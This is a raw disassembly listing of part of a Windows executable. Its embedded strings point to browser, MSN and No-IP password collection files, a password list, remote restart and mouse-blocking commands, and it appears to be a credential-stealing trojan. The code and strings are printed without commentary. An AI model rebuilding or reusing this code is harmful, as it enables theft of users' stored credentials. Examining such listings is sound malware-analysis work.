  40be6b:	e8 e0 5e ff ff       	call   0x401d50
  40be70:	50                   	push   %eax
  40be71:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40be74:	e8 8f a1 ff ff       	call   0x406008
  40be79:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40be7c:	ba 7c c1 40 00       	mov    $0x40c17c,%edx
  40be81:	e8 d2 5e ff ff       	call   0x401d58
  40be86:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40be89:	8b 15 ec f1 40 00    	mov    0x40f1ec,%edx
  40be8f:	59                   	pop    %ecx
  40be90:	e8 db 9e ff ff       	call   0x405d70
  40be95:	e9 0f 02 00 00       	jmp    0x40c0a9
  40be9a:	53                   	push   %ebx
  40be9b:	e8 98 76 ff ff       	call   0x403538
  40bea0:	68 88 c1 40 00       	push   $0x40c188
  40bea5:	6a 00                	push   $0x0
  40bea7:	6a 00                	push   $0x0
  40bea9:	e8 ba 76 ff ff       	call   0x403568
  40beae:	8b d8                	mov    %eax,%ebx
  40beb0:	e8 3b 77 ff ff       	call   0x4035f0
  40beb5:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40beba:	75 49                	jne    0x40bf05
  40bebc:	53                   	push   %ebx
  40bebd:	e8 76 76 ff ff       	call   0x403538
  40bec2:	6a 00                	push   $0x0
  40bec4:	a1 70 e6 40 00       	mov    0x40e670,%eax
  40bec9:	50                   	push   %eax
  40beca:	b8 b8 b0 40 00       	mov    $0x40b0b8,%eax
  40becf:	50                   	push   %eax
  40bed0:	6a 0d                	push   $0xd
  40bed2:	e8 39 78 ff ff       	call   0x403710
  40bed7:	6a 00                	push   $0x0
  40bed9:	a1 70 e6 40 00       	mov    0x40e670,%eax
  40bede:	50                   	push   %eax
  40bedf:	b8 08 b1 40 00       	mov    $0x40b108,%eax
  40bee4:	50                   	push   %eax
  40bee5:	6a 0e                	push   $0xe
  40bee7:	e8 24 78 ff ff       	call   0x403710
  40beec:	eb 05                	jmp    0x40bef3
  40beee:	e8 25 9a ff ff       	call   0x405918
  40bef3:	e8 8c fb ff ff       	call   0x40ba84
  40bef8:	84 c0                	test   %al,%al
  40befa:	74 f2                	je     0x40beee
  40befc:	6a 00                	push   $0x0
  40befe:	e8 9d 76 ff ff       	call   0x4035a0
  40bf03:	eb 06                	jmp    0x40bf0b
  40bf05:	53                   	push   %ebx
  40bf06:	e8 2d 76 ff ff       	call   0x403538
  40bf0b:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  40bf0e:	b8 01 00 00 00       	mov    $0x1,%eax
  40bf13:	e8 8c 54 ff ff       	call   0x4013a4
  40bf18:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40bf1b:	ba a8 c1 40 00       	mov    $0x40c1a8,%edx
  40bf20:	e8 6f 5f ff ff       	call   0x401e94
  40bf25:	74 0a                	je     0x40bf31
  40bf27:	68 e8 03 00 00       	push   $0x3e8
  40bf2c:	e8 47 77 ff ff       	call   0x403678
  40bf31:	e8 ce 86 ff ff       	call   0x404604
  40bf36:	e8 e1 89 ff ff       	call   0x40491c
  40bf3b:	e8 d8 f1 ff ff       	call   0x40b118
  40bf40:	a1 04 d2 40 00       	mov    0x40d204,%eax
  40bf45:	8b 00                	mov    (%eax),%eax
  40bf47:	e8 fc 5f ff ff       	call   0x401f48
  40bf4c:	50                   	push   %eax
  40bf4d:	6a 00                	push   $0x0
  40bf4f:	6a 00                	push   $0x0
  40bf51:	e8 12 76 ff ff       	call   0x403568
  40bf56:	8b d8                	mov    %eax,%ebx
  40bf58:	e8 93 76 ff ff       	call   0x4035f0
  40bf5d:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40bf62:	0f 85 c1 00 00 00    	jne    0x40c029
  40bf68:	53                   	push   %ebx
  40bf69:	e8 ca 75 ff ff       	call   0x403538
  40bf6e:	68 e8 03 00 00       	push   $0x3e8
  40bf73:	e8 00 77 ff ff       	call   0x403678
  40bf78:	a1 04 d2 40 00       	mov    0x40d204,%eax
  40bf7d:	8b 00                	mov    (%eax),%eax
  40bf7f:	e8 c4 5f ff ff       	call   0x401f48
  40bf84:	50                   	push   %eax
  40bf85:	6a 00                	push   $0x0
  40bf87:	6a 00                	push   $0x0
  40bf89:	e8 da 75 ff ff       	call   0x403568
  40bf8e:	8b d8                	mov    %eax,%ebx
  40bf90:	e8 5b 76 ff ff       	call   0x4035f0
  40bf95:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40bf9a:	0f 85 81 00 00 00    	jne    0x40c021
  40bfa0:	53                   	push   %ebx
  40bfa1:	e8 92 75 ff ff       	call   0x403538
  40bfa6:	68 e8 03 00 00       	push   $0x3e8
  40bfab:	e8 c8 76 ff ff       	call   0x403678
  40bfb0:	a1 04 d2 40 00       	mov    0x40d204,%eax
  40bfb5:	8b 00                	mov    (%eax),%eax
  40bfb7:	e8 8c 5f ff ff       	call   0x401f48
  40bfbc:	50                   	push   %eax
  40bfbd:	6a 00                	push   $0x0
  40bfbf:	6a 00                	push   $0x0
  40bfc1:	e8 a2 75 ff ff       	call   0x403568
  40bfc6:	8b d8                	mov    %eax,%ebx
  40bfc8:	e8 23 76 ff ff       	call   0x4035f0
  40bfcd:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40bfd2:	75 45                	jne    0x40c019
  40bfd4:	53                   	push   %ebx
  40bfd5:	e8 5e 75 ff ff       	call   0x403538
  40bfda:	68 e8 03 00 00       	push   $0x3e8
  40bfdf:	e8 94 76 ff ff       	call   0x403678
  40bfe4:	a1 04 d2 40 00       	mov    0x40d204,%eax
  40bfe9:	8b 00                	mov    (%eax),%eax
  40bfeb:	e8 58 5f ff ff       	call   0x401f48
  40bff0:	50                   	push   %eax
  40bff1:	6a 00                	push   $0x0
  40bff3:	6a 00                	push   $0x0
  40bff5:	e8 6e 75 ff ff       	call   0x403568
  40bffa:	8b d8                	mov    %eax,%ebx
  40bffc:	e8 ef 75 ff ff       	call   0x4035f0
  40c001:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40c006:	75 09                	jne    0x40c011
  40c008:	6a 00                	push   $0x0
  40c00a:	e8 91 75 ff ff       	call   0x4035a0
  40c00f:	eb 1e                	jmp    0x40c02f
  40c011:	53                   	push   %ebx
  40c012:	e8 21 75 ff ff       	call   0x403538
  40c017:	eb 16                	jmp    0x40c02f
  40c019:	53                   	push   %ebx
  40c01a:	e8 19 75 ff ff       	call   0x403538
  40c01f:	eb 0e                	jmp    0x40c02f
  40c021:	53                   	push   %ebx
  40c022:	e8 11 75 ff ff       	call   0x403538
  40c027:	eb 06                	jmp    0x40c02f
  40c029:	53                   	push   %ebx
  40c02a:	e8 09 75 ff ff       	call   0x403538
  40c02f:	a1 dc d1 40 00       	mov    0x40d1dc,%eax
  40c034:	80 38 01             	cmpb   $0x1,(%eax)
  40c037:	75 24                	jne    0x40c05d
  40c039:	8d 55 ac             	lea    -0x54(%ebp),%edx
  40c03c:	33 c0                	xor    %eax,%eax
  40c03e:	e8 61 53 ff ff       	call   0x4013a4
  40c043:	8b 45 ac             	mov    -0x54(%ebp),%eax
  40c046:	8d 55 b0             	lea    -0x50(%ebp),%edx
  40c049:	e8 06 ab ff ff       	call   0x406b54
  40c04e:	8b 55 b0             	mov    -0x50(%ebp),%edx
  40c051:	b8 e8 f1 40 00       	mov    $0x40f1e8,%eax
  40c056:	e8 b9 5a ff ff       	call   0x401b14
  40c05b:	eb 0c                	jmp    0x40c069
  40c05d:	ba e8 f1 40 00       	mov    $0x40f1e8,%edx
  40c062:	33 c0                	xor    %eax,%eax
  40c064:	e8 3b 53 ff ff       	call   0x4013a4
  40c069:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40c06c:	e8 97 9f ff ff       	call   0x406008
  40c071:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40c074:	ba b8 c1 40 00       	mov    $0x40c1b8,%edx
  40c079:	e8 da 5c ff ff       	call   0x401d58
  40c07e:	8b 55 a8             	mov    -0x58(%ebp),%edx
  40c081:	a1 e8 f1 40 00       	mov    0x40f1e8,%eax
  40c086:	e8 b1 f8 ff ff       	call   0x40b93c
  40c08b:	a1 14 d2 40 00       	mov    0x40d214,%eax
  40c090:	80 38 01             	cmpb   $0x1,(%eax)
  40c093:	75 0f                	jne    0x40c0a4
  40c095:	e8 62 f7 ff ff       	call   0x40b7fc
  40c09a:	68 e8 03 00 00       	push   $0x3e8
  40c09f:	e8 d4 75 ff ff       	call   0x403678
  40c0a4:	e8 17 f3 ff ff       	call   0x40b3c0
  40c0a9:	33 c0                	xor    %eax,%eax
  40c0ab:	5a                   	pop    %edx
  40c0ac:	59                   	pop    %ecx
  40c0ad:	59                   	pop    %ecx
  40c0ae:	64 89 10             	mov    %edx,%fs:(%eax)
  40c0b1:	68 cb c0 40 00       	push   $0x40c0cb
  40c0b6:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40c0b9:	ba 12 00 00 00       	mov    $0x12,%edx
  40c0be:	e8 21 5a ff ff       	call   0x401ae4
  40c0c3:	c3                   	ret
  40c0c4:	e9 43 57 ff ff       	jmp    0x40180c
  40c0c9:	eb eb                	jmp    0x40c0b6
  40c0cb:	5b                   	pop    %ebx
  40c0cc:	e8 07 59 ff ff       	call   0x4019d8
  40c0d1:	00 00                	add    %al,(%eax)
  40c0d3:	00 5f 78             	add    %bl,0x78(%edi)
  40c0d6:	5f                   	pop    %edi
  40c0d7:	58                   	pop    %eax
  40c0d8:	5f                   	pop    %edi
  40c0d9:	55                   	push   %ebp
  40c0da:	50                   	push   %eax
  40c0db:	44                   	inc    %esp
  40c0dc:	41                   	inc    %ecx
  40c0dd:	54                   	push   %esp
  40c0de:	45                   	inc    %ebp
  40c0df:	5f                   	pop    %edi
  40c0e0:	58                   	pop    %eax
  40c0e1:	5f                   	pop    %edi
  40c0e2:	78 5f                	js     0x40c143
  40c0e4:	00 00                	add    %al,(%eax)
  40c0e6:	00 00                	add    %al,(%eax)
  40c0e8:	5f                   	pop    %edi
  40c0e9:	78 5f                	js     0x40c14a
  40c0eb:	58                   	pop    %eax
  40c0ec:	5f                   	pop    %edi
  40c0ed:	50                   	push   %eax
  40c0ee:	41                   	inc    %ecx
  40c0ef:	53                   	push   %ebx
  40c0f0:	53                   	push   %ebx
  40c0f1:	57                   	push   %edi
  40c0f2:	4f                   	dec    %edi
  40c0f3:	52                   	push   %edx
  40c0f4:	44                   	inc    %esp
  40c0f5:	4c                   	dec    %esp
  40c0f6:	49                   	dec    %ecx
  40c0f7:	53                   	push   %ebx
  40c0f8:	54                   	push   %esp
  40c0f9:	5f                   	pop    %edi
  40c0fa:	58                   	pop    %eax
  40c0fb:	5f                   	pop    %edi
  40c0fc:	78 5f                	js     0x40c15d
  40c0fe:	00 00                	add    %al,(%eax)
  40c100:	ff                   	(bad)
  40c101:	ff                   	(bad)
  40c102:	ff                   	(bad)
  40c103:	ff 08                	decl   (%eax)
  40c105:	00 00                	add    %al,(%eax)
  40c107:	00 4e 4f             	add    %cl,0x4f(%esi)
  40c10a:	49                   	dec    %ecx
  40c10b:	50                   	push   %eax
  40c10c:	2e 61                	cs popa
  40c10e:	62 63 00             	bound  %esp,0x0(%ebx)
  40c111:	00 00                	add    %al,(%eax)
  40c113:	00 ff                	add    %bh,%bh
  40c115:	ff                   	(bad)
  40c116:	ff                   	(bad)
  40c117:	ff 07                	incl   (%edi)
  40c119:	00 00                	add    %al,(%eax)
  40c11b:	00 4d 53             	add    %cl,0x53(%ebp)
  40c11e:	4e                   	dec    %esi
  40c11f:	2e 61                	cs popa
  40c121:	62 63 00             	bound  %esp,0x0(%ebx)
  40c124:	ff                   	(bad)
  40c125:	ff                   	(bad)
  40c126:	ff                   	(bad)
  40c127:	ff 0b                	decl   (%ebx)
  40c129:	00 00                	add    %al,(%eax)
  40c12b:	00 46 49             	add    %al,0x49(%esi)
  40c12e:	52                   	push   %edx
  40c12f:	45                   	inc    %ebp
  40c130:	46                   	inc    %esi
  40c131:	4f                   	dec    %edi
  40c132:	58                   	pop    %eax
  40c133:	2e 61                	cs popa
  40c135:	62 63 00             	bound  %esp,0x0(%ebx)
  40c138:	ff                   	(bad)
  40c139:	ff                   	(bad)
  40c13a:	ff                   	(bad)
  40c13b:	ff 0b                	decl   (%ebx)
  40c13d:	00 00                	add    %al,(%eax)
  40c13f:	00 49 45             	add    %cl,0x45(%ecx)
  40c142:	4c                   	dec    %esp
  40c143:	4f                   	dec    %edi
  40c144:	47                   	inc    %edi
  40c145:	49                   	dec    %ecx
  40c146:	4e                   	dec    %esi
  40c147:	2e 61                	cs popa
  40c149:	62 63 00             	bound  %esp,0x0(%ebx)
  40c14c:	ff                   	(bad)
  40c14d:	ff                   	(bad)
  40c14e:	ff                   	(bad)
  40c14f:	ff 0a                	decl   (%edx)
  40c151:	00 00                	add    %al,(%eax)
  40c153:	00 49 45             	add    %cl,0x45(%ecx)
  40c156:	50                   	push   %eax
  40c157:	41                   	inc    %ecx
  40c158:	53                   	push   %ebx
  40c159:	53                   	push   %ebx
  40c15a:	2e 61                	cs popa
  40c15c:	62 63 00             	bound  %esp,0x0(%ebx)
  40c15f:	00 ff                	add    %bh,%bh
  40c161:	ff                   	(bad)
  40c162:	ff                   	(bad)
  40c163:	ff 0a                	decl   (%edx)
  40c165:	00 00                	add    %al,(%eax)
  40c167:	00 49 45             	add    %cl,0x45(%ecx)
  40c16a:	41                   	inc    %ecx
  40c16b:	55                   	push   %ebp
  40c16c:	54                   	push   %esp
  40c16d:	4f                   	dec    %edi
  40c16e:	2e 61                	cs popa
  40c170:	62 63 00             	bound  %esp,0x0(%ebx)
  40c173:	00 ff                	add    %bh,%bh
  40c175:	ff                   	(bad)
  40c176:	ff                   	(bad)
  40c177:	ff 09                	decl   (%ecx)
  40c179:	00 00                	add    %al,(%eax)
  40c17b:	00 49 45             	add    %cl,0x45(%ecx)
  40c17e:	57                   	push   %edi
  40c17f:	45                   	inc    %ebp
  40c180:	42                   	inc    %edx
  40c181:	2e 61                	cs popa
  40c183:	62 63 00             	bound  %esp,0x0(%ebx)
  40c186:	00 00                	add    %al,(%eax)
  40c188:	5f                   	pop    %edi
  40c189:	78 5f                	js     0x40c1ea
  40c18b:	58                   	pop    %eax
  40c18c:	5f                   	pop    %edi
  40c18d:	42                   	inc    %edx
  40c18e:	4c                   	dec    %esp
  40c18f:	4f                   	dec    %edi
  40c190:	43                   	inc    %ebx
  40c191:	4b                   	dec    %ebx
  40c192:	4d                   	dec    %ebp
  40c193:	4f                   	dec    %edi
  40c194:	55                   	push   %ebp
  40c195:	53                   	push   %ebx
  40c196:	45                   	inc    %ebp
  40c197:	5f                   	pop    %edi
  40c198:	58                   	pop    %eax
  40c199:	5f                   	pop    %edi
  40c19a:	78 5f                	js     0x40c1fb
  40c19c:	00 00                	add    %al,(%eax)
  40c19e:	00 00                	add    %al,(%eax)
  40c1a0:	ff                   	(bad)
  40c1a1:	ff                   	(bad)
  40c1a2:	ff                   	(bad)
  40c1a3:	ff 07                	incl   (%edi)
  40c1a5:	00 00                	add    %al,(%eax)
  40c1a7:	00 52 65             	add    %dl,0x65(%edx)
  40c1aa:	73 74                	jae    0x40c220
  40c1ac:	61                   	popa
  40c1ad:	72 74                	jb     0x40c223
  40c1af:	00 ff                	add    %bh,%bh
  40c1b1:	ff                   	(bad)
  40c1b2:	ff                   	(bad)
  40c1b3:	ff 0e                	decl   (%esi)
  40c1b5:	00 00                	add    %al,(%eax)
  40c1b7:	00 58 58             	add    %bl,0x58(%eax)
  40c1ba:	2d 2d 58 58 2d       	sub    $0x2d58582d,%eax
  40c1bf:	2d 58 58 2e 74       	sub    $0x742e5858,%eax
  40c1c4:	78 74                	js     0x40c23a
	...
